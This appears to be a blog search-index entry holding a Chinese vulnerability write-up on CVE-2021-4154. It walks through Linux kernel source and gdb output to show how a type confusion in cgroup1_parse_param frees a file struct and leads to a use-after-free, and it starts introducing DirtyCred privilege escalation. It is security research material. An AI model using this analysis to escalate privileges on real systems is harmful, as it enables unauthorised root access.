<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CVE-2021-4154</title>
    <url>/2023/01/11/CVE-2021-4154/</url>
    <content><![CDATA[<p>CVE-2021-4154 复现，利用 file 结构体在同一特权 slab 中通过 DirtyCred 提权。</p>
<p><img src="/img/CVE-2021-4154/cover.png"></p>
<span id="more"></span>

<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>影响版本：Linux v5.13.4 以前，v5.13.4 已修补。</p>
<p>复现版本：Linux-5.13.3。<a href="https://github.com/bsauce/kernel-exploit-factory">exp, config及测试环境下载地址</a></p>
<p>编译选项：在编译时将 .config 中的 CONFIG_E1000 和 CONFIG_E1000E，变更为&#x3D;y。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ wget https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-5.13.3.tar.xz</span><br><span class="line">❯ tar -xvf ./linux-5.13.3.tar.xz</span><br><span class="line">❯ nohup make -j $(nproc) bzImage &amp;</span><br><span class="line">// Warn for stack frames larger than 选项改为 4096（避免编译报错）</span><br></pre></td></tr></table></figure>

<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><h2 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h2><p>先看补丁：</p>
<p><img src="/img/CVE-2021-4154/1-1.png"></p>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>从系统调用入口开始逐级分析：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">__do_sys_fsconfig (aux=4, _value=0x0 &lt;fixed_percpu_data&gt;, _key=0x4b226a &quot;source&quot;, cmd=5, fd=3) </span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * sys_fsconfig - Set parameters and trigger actions on a context</span></span><br><span class="line"><span class="comment"> * @fd: The filesystem context to act upon</span></span><br><span class="line"><span class="comment"> * @cmd: The action to take</span></span><br><span class="line"><span class="comment"> * @_key: Where appropriate, the parameter key to set</span></span><br><span class="line"><span class="comment"> * @_value: Where appropriate, the parameter value to set</span></span><br><span class="line"><span class="comment"> * @aux: Additional information for the value</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This system call is used to set parameters on a context, including</span></span><br><span class="line"><span class="comment"> * superblock settings, data source and security labelling.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * (*) fsconfig_set_fd: An open file descriptor is specified.  @_value must be</span></span><br><span class="line"><span class="comment"> *     NULL and @aux indicates the file descriptor.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">SYSCALL_DEFINE5(fsconfig,</span><br><span class="line">		<span class="type">int</span>, fd,</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span>, cmd,</span><br><span class="line">		<span class="type">const</span> <span class="type">char</span> __user *, _key,</span><br><span class="line">		<span class="type">const</span> <span class="type">void</span> __user *, _value,</span><br><span class="line">		<span class="type">int</span>, aux)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fs_context</span> *<span class="title">fc</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line">	<span class="type">int</span> lookup_flags = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fs_parameter</span> <span class="title">param</span> =</span> &#123;</span><br><span class="line">		.type	= fs_value_is_undefined,</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">	···</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_SET_FD:</span><br><span class="line">		<span class="keyword">if</span> (!_key || _value || aux &lt; <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	···</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	f = fdget(fd);								<span class="comment">// 获得fd</span></span><br><span class="line">	<span class="keyword">if</span> (!f.file)</span><br><span class="line">		<span class="keyword">return</span> -EBADF;</span><br><span class="line">	ret = -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (f.file-&gt;f_op != &amp;fscontext_fops)</span><br><span class="line">		<span class="keyword">goto</span> out_f;</span><br><span class="line"></span><br><span class="line">	fc = f.file-&gt;private_data;</span><br><span class="line">	<span class="keyword">if</span> (fc-&gt;ops == &amp;legacy_fs_context_ops) &#123; <span class="comment">// fc-&gt;ops=cgroup1_fs_context_ops</span></span><br><span class="line">		···</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (_key) &#123;</span><br><span class="line">		param.key = strndup_user(_key, <span class="number">256</span>);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(param.key)) &#123;</span><br><span class="line">			ret = PTR_ERR(param.key);</span><br><span class="line">			<span class="keyword">goto</span> out_f;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">	···</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_SET_FD:</span><br><span class="line">		param.type = fs_value_is_file;		<span class="comment">// 设置 type</span></span><br><span class="line">		ret = -EBADF;</span><br><span class="line">		param.file = fget(aux);		<span class="comment">// 参数aux指定的文件描述符对应的struct file</span></span><br><span class="line">		<span class="keyword">if</span> (!param.file)</span><br><span class="line">			<span class="keyword">goto</span> out_key;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ret = mutex_lock_interruptible(&amp;fc-&gt;uapi_mutex);</span><br><span class="line">	<span class="keyword">if</span> (ret == <span class="number">0</span>) &#123;</span><br><span class="line">		ret = vfs_fsconfig_locked(fc, cmd, &amp;param);		<span class="comment">// 进入</span></span><br><span class="line">		mutex_unlock(&amp;fc-&gt;uapi_mutex);</span><br><span class="line">	&#125;</span><br><span class="line">	···</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里涉及到两个主要的结构体，fs_parameter 和 fs_context。</p>
<details class="note "><summary><p>fs_context 结构体</p>
</summary>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fs_context</span> &#123;</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">fs_context_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>		<span class="title">uapi_mutex</span>;</span>	<span class="comment">/* Userspace access mutex */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file_system_type</span>	*<span class="title">fs_type</span>;</span></span><br><span class="line">	<span class="type">void</span>			*fs_private;	<span class="comment">/* The filesystem&#x27;s context */</span></span><br><span class="line">	<span class="type">void</span>			*sget_key;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dentry</span>		*<span class="title">root</span>;</span>		<span class="comment">/* The root and superblock */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span>	*<span class="title">user_ns</span>;</span>	<span class="comment">/* The user namespace for this mount */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">net</span>		*<span class="title">net_ns</span>;</span>	<span class="comment">/* The network namespace for this mount */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span>	*<span class="title">cred</span>;</span>		<span class="comment">/* The mounter&#x27;s credentials */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">p_log</span>		<span class="title">log</span>;</span>		<span class="comment">/* Logging buffer */</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span>		*source;	<span class="comment">/* The source name (eg. dev path) */</span></span><br><span class="line">	<span class="type">void</span>			*security;	<span class="comment">/* Linux S&amp;M options */</span></span><br><span class="line">	<span class="type">void</span>			*s_fs_info;	<span class="comment">/* Proposed s_fs_info */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		sb_flags;	<span class="comment">/* Proposed superblock flags (SB_*) */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		sb_flags_mask;	<span class="comment">/* Superblock flags that were changed */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		s_iflags;	<span class="comment">/* OR&#x27;d with sb-&gt;s_iflags */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		lsm_flags;	<span class="comment">/* Information flags from the fs to the LSM */</span></span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">fs_context_purpose</span>	<span class="title">purpose</span>:</span><span class="number">8</span>;</span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">fs_context_phase</span>	<span class="title">phase</span>:</span><span class="number">8</span>;	<span class="comment">/* The phase the context is in */</span></span><br><span class="line">	<span class="type">bool</span>			need_free:<span class="number">1</span>;	<span class="comment">/* Need to call ops-&gt;free() */</span></span><br><span class="line">	<span class="type">bool</span>			global:<span class="number">1</span>;	<span class="comment">/* Goes into &amp;init_user_ns */</span></span><br><span class="line">	<span class="type">bool</span>			oldapi:<span class="number">1</span>;	<span class="comment">/* Coming from mount(2) */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

</details>

<details class="note "><summary><p>fs_parameter 结构体</p>
</summary>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fs_parameter</span> &#123;</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span>		*key;		<span class="comment">/* Parameter name */</span></span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">fs_value_type</span>	<span class="title">type</span>:</span><span class="number">8</span>;		<span class="comment">/* The type of value here */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">char</span>		*<span class="built_in">string</span>;</span><br><span class="line">		<span class="type">void</span>		*blob;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">filename</span>	*<span class="title">name</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">file</span>	*<span class="title">file</span>;</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="type">size_t</span>	size;</span><br><span class="line">	<span class="type">int</span>	dirfd;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

</details>

<p>进入 vfs_fsconfig_locked 前 param 的结构：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gef➤  p *param</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">5 = &#123;</span></span><br><span class="line">  key = 0xffff888101eb3bc8 &quot;source&quot;,</span><br><span class="line">  type = fs_value_is_file,</span><br><span class="line">  &#123;</span><br><span class="line">    string = 0xffff88810248f500 &quot;&quot;,</span><br><span class="line">    blob = 0xffff88810248f500,</span><br><span class="line">    name = 0xffff88810248f500,</span><br><span class="line">    file = 0xffff88810248f500</span><br><span class="line">  &#125;,</span><br><span class="line">  size = 0x0,</span><br><span class="line">  dirfd = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续走：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">vfs_fsconfig_locked</span><span class="params">(<span class="keyword">struct</span> fs_context *fc, <span class="type">int</span> cmd,</span></span><br><span class="line"><span class="params">			       <span class="keyword">struct</span> fs_parameter *param)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> *<span class="title">sb</span>;</span></span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	ret = finish_clean_context(fc);</span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line">	<span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">	···</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">if</span> (fc-&gt;phase != FS_CONTEXT_CREATE_PARAMS &amp;&amp;</span><br><span class="line">		    fc-&gt;phase != FS_CONTEXT_RECONF_PARAMS)</span><br><span class="line">			<span class="keyword">return</span> -EBUSY;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> vfs_parse_fs_param(fc, param);	<span class="comment">// 进入</span></span><br><span class="line">	&#125;</span><br><span class="line">	fc-&gt;phase = FS_CONTEXT_FAILED;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续进入之前，fc：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gef➤  p *fc</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">3 = &#123;</span></span><br><span class="line">  ops = 0xffffffff82228420 &lt;cgroup1_fs_context_ops&gt;,</span><br><span class="line">  ···</span><br><span class="line">  fs_type = 0xffffffff829a2e80 &lt;cgroup_fs_type&gt;,</span><br><span class="line">  ···</span><br><span class="line">  source = 0x0 &lt;fixed_percpu_data&gt;,</span><br><span class="line">  ···</span><br><span class="line">  phase = FS_CONTEXT_CREATE_PARAMS,</span><br><span class="line">  ···</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vfs_parse_fs_param</span><span class="params">(<span class="keyword">struct</span> fs_context *fc, <span class="keyword">struct</span> fs_parameter *param)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!param-&gt;key)</span><br><span class="line">		<span class="keyword">return</span> invalf(fc, <span class="string">&quot;Unnamed parameter\n&quot;</span>);</span><br><span class="line">	···</span><br><span class="line">	<span class="keyword">if</span> (fc-&gt;ops-&gt;parse_param) &#123;	 <span class="comment">// 若存在 parse_apram 函数则调用解析</span></span><br><span class="line">		ret = fc-&gt;ops-&gt;parse_param(fc, param);	<span class="comment">// 进入</span></span><br><span class="line">		<span class="keyword">if</span> (ret != -ENOPARAM)</span><br><span class="line">			<span class="keyword">return</span> ret;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* If the filesystem doesn&#x27;t take any arguments, give it the</span></span><br><span class="line"><span class="comment">	 * default handling of source.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">strcmp</span>(param-&gt;key, <span class="string">&quot;source&quot;</span>) == <span class="number">0</span>) &#123;	<span class="comment">// [!] 注意这里，对 param-&gt;type 进行了 string 的判断，是全面的</span></span><br><span class="line">		<span class="keyword">if</span> (param-&gt;type != fs_value_is_string)</span><br><span class="line">			<span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Non-string source&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (fc-&gt;source)</span><br><span class="line">			<span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Multiple sources&quot;</span>);</span><br><span class="line">		fc-&gt;source = param-&gt;<span class="built_in">string</span>;</span><br><span class="line">		param-&gt;<span class="built_in">string</span> = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> invalf(fc, <span class="string">&quot;%s: Unknown parameter &#x27;%s&#x27;&quot;</span>,</span><br><span class="line">		      fc-&gt;fs_type-&gt;name, param-&gt;key);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(vfs_parse_fs_param);</span><br></pre></td></tr></table></figure>

<p><img src="/img/CVE-2021-4154/1-2.png"></p>
<p>进入漏洞函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">cgroup1_parse_param</span><span class="params">(<span class="keyword">struct</span> fs_context *fc, <span class="keyword">struct</span> fs_parameter *param)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cgroup_fs_context</span> *<span class="title">ctx</span> =</span> cgroup_fc2context(fc);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cgroup_subsys</span> *<span class="title">ss</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fs_parse_result</span> <span class="title">result</span>;</span></span><br><span class="line">	<span class="type">int</span> opt, i;</span><br><span class="line"></span><br><span class="line">	opt = fs_parse(fc, cgroup1_fs_parameters, param, &amp;result);</span><br><span class="line">	<span class="keyword">if</span> (opt == -ENOPARAM) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strcmp</span>(param-&gt;key, <span class="string">&quot;source&quot;</span>) == <span class="number">0</span>) &#123;	<span class="comment">// [!][1]</span></span><br><span class="line">			<span class="keyword">if</span> (fc-&gt;source)		<span class="comment">// [!][2]</span></span><br><span class="line">				<span class="keyword">return</span> invalf(fc, <span class="string">&quot;Multiple sources not supported&quot;</span>);</span><br><span class="line">			fc-&gt;source = param-&gt;<span class="built_in">string</span>;</span><br><span class="line">			param-&gt;<span class="built_in">string</span> = <span class="literal">NULL</span>;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		···</span><br><span class="line">	&#125;</span><br><span class="line">	···</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意[1][2]处没有像上面一样判断是否为字符串。而就将 param-&gt;string 处的值赋值给了 fc-&gt;source。注意 fc-&gt;source 是一个 const char 类型的指针。再回顾一下 fs_parameter 的结构：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Type of parameter value.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">fs_value_type</span> &#123;</span></span><br><span class="line">	fs_value_is_undefined,</span><br><span class="line">	fs_value_is_flag,		<span class="comment">/* Value not given a value */</span></span><br><span class="line">	fs_value_is_string,		<span class="comment">/* Value is a string */</span></span><br><span class="line">	fs_value_is_blob,		<span class="comment">/* Value is a binary blob */</span></span><br><span class="line">	fs_value_is_filename,		<span class="comment">/* Value is a filename* + dirfd */</span></span><br><span class="line">	fs_value_is_file,		<span class="comment">/* Value is a file* */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fs_parameter</span> &#123;</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span>		*key;		<span class="comment">/* Parameter name */</span></span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">fs_value_type</span>	<span class="title">type</span>:</span><span class="number">8</span>;		<span class="comment">/* The type of value here */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">char</span>		*<span class="built_in">string</span>;</span><br><span class="line">		<span class="type">void</span>		*blob;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">filename</span>	*<span class="title">name</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">file</span>	*<span class="title">file</span>;</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="type">size_t</span>	size;</span><br><span class="line">	<span class="type">int</span>	dirfd;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>string 所在的字段是一个联合体，根据 fs_value_type 来确定，而由于之前的设定，此处的 type 为:</p>
<p><img src="/img/CVE-2021-4154/1-3.png"></p>
<p><strong>所以此时相当于将系统调用传入的最后一个参数指向的 file 结构体的指针赋值给了 fc-&gt;context。</strong>而正常的逻辑应该是这里只想传递一下字符串。此时将文件结构体认为是字符串，后面在 close 文件系统描述符的时候就会发生非法释放该结构体。</p>
<h2 id="非法释放文件结构体"><a href="#非法释放文件结构体" class="headerlink" title="非法释放文件结构体"></a>非法释放文件结构体</h2><p>寻找关闭文件系统文件描述符时的具体操作，首先释放使用的是 fscontext_release 函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">fscontext_release</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fs_context</span> *<span class="title">fc</span> =</span> file-&gt;private_data;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fc) &#123;</span><br><span class="line">		file-&gt;private_data = <span class="literal">NULL</span>;</span><br><span class="line">		put_fs_context(fc);		<span class="comment">// 传入 fs_context</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">fscontext_fops</span> =</span> &#123;</span><br><span class="line">	.read		= fscontext_read,</span><br><span class="line">	.release	= fscontext_release,</span><br><span class="line">	.llseek		= no_llseek,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>调用了 put_fs_context 来释放 struct fs_context 的各个字段和其自身：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * put_fs_context - Dispose of a superblock configuration context.</span></span><br><span class="line"><span class="comment"> * @fc: The context to dispose of.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">put_fs_context</span><span class="params">(<span class="keyword">struct</span> fs_context *fc)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> *<span class="title">sb</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fc-&gt;root) &#123;</span><br><span class="line">		sb = fc-&gt;root-&gt;d_sb;</span><br><span class="line">		dput(fc-&gt;root);</span><br><span class="line">		fc-&gt;root = <span class="literal">NULL</span>;</span><br><span class="line">		deactivate_super(sb);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fc-&gt;need_free &amp;&amp; fc-&gt;ops &amp;&amp; fc-&gt;ops-&gt;<span class="built_in">free</span>)</span><br><span class="line">		fc-&gt;ops-&gt;<span class="built_in">free</span>(fc);</span><br><span class="line"></span><br><span class="line">	security_free_mnt_opts(&amp;fc-&gt;security);</span><br><span class="line">	put_net(fc-&gt;net_ns);</span><br><span class="line">	put_user_ns(fc-&gt;user_ns);</span><br><span class="line">	put_cred(fc-&gt;cred);</span><br><span class="line">	put_fc_log(fc);</span><br><span class="line">	put_filesystem(fc-&gt;fs_type);</span><br><span class="line">	kfree(fc-&gt;source);		<span class="comment">// [!!!]</span></span><br><span class="line">	kfree(fc);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(put_fs_context);</span><br></pre></td></tr></table></figure>

<p>注意倒数第二行会直接 kfree fc-&gt;source，<strong>而这里在上面构造的系统调用中为最后一个参数所指定的文件结构体。而文件描述符还是会指向此处。但是此处已经被 free，那么再打开其他文件时创建的 file 结构体就有可能占用此处，形成 UAF。进而通过该文件描述符修改其他文件。</strong></p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>漏洞的利用主要是 DirtyCred 技术。细节见参考文章[1]。</p>
<p>本文只对其中重要的利用过程描述。</p>
<h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><h3 id="Credentials-in-Linux-kernel"><a href="#Credentials-in-Linux-kernel" class="headerlink" title="Credentials in Linux kernel"></a>Credentials in Linux kernel</h3><p>凭证就是包含了一些权限信息的内核属性，最常见的就是 cred，文件的 file，inode 等，这些结构体中都包括了一些指明所属和各种权限的字段。<strong>如果能通过一些漏洞完成篡改&#x2F;替换这些凭证结构或其中的关键信息，就可以达到提权的效果。</strong>初学 linux kernel 时覆写 task struct 就是相同的思想。</p>
<h3 id="cred"><a href="#cred" class="headerlink" title="cred"></a>cred</h3><p>struct cred 常用于内核 task 模块中，表示一个进程&#x2F;任务的权限信息，包括uid、gid、euid…等身份信息，还有capability 信息。</p>
<details class="note "><summary><p>cred 结构体</p>
</summary>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="type">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="type">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="type">void</span>		*put_addr;</span><br><span class="line">	<span class="type">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="type">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="type">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="type">void</span>		*security;	<span class="comment">/* LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="comment">/* RCU deletion */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">int</span> non_rcu;			<span class="comment">/* Can we skip RCU deletion? */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">	&#125;;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

</details>

